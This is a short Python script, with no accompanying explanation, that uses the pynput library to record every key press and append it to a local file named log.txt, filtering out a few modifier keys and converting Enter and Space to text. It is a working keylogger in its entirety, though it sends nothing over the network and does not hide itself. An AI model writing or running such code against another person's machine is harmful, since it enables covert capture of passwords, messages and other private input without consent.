from pynput.keyboard import Listener

ignore_key = ["Key.backspace","Key.shift","Key.ctrl_r","Key.tab"]

def log_inputs(key):
    key_value = str(key).replace("'","")

    if key_value == "Key.enter":
        key_value = "\n"
    if key_value == "Key.space":
        key_value = " "
    if key_value in ignore_key:
        key_value = ""
    
    with open("log.txt","a") as f:
        f.write(key_value)

with Listener(on_press=log_inputs) as l:
    l.join()